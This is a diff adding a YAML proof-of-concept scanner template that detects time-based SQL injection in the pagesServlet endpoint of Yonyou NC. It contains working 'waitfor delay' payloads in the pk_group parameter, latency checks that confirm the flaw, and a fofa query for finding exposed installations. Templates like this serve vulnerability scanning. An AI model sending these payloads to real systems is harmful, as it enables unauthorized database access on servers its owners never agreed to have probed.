@@ -1,0 +1,24 @@
+name: poc-yaml-yongyouNC-pagesServlet-sql-injection
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1'waitfor+delay+'0:0:3'-- 
+    expression: response.status == 200 && response.latency >= 3000 && response.latency <= 4000
+  r1:
+    request:
+      method: GET
+      path: /portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1'waitfor+delay+'0:0:6'-- 
+    expression: response.status == 200 && response.latency >= 6000 && response.latency <= 7000
+expression: r0() && r1()
+
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139579873
+
+# fofa: app="用友-UFIDA-NC"
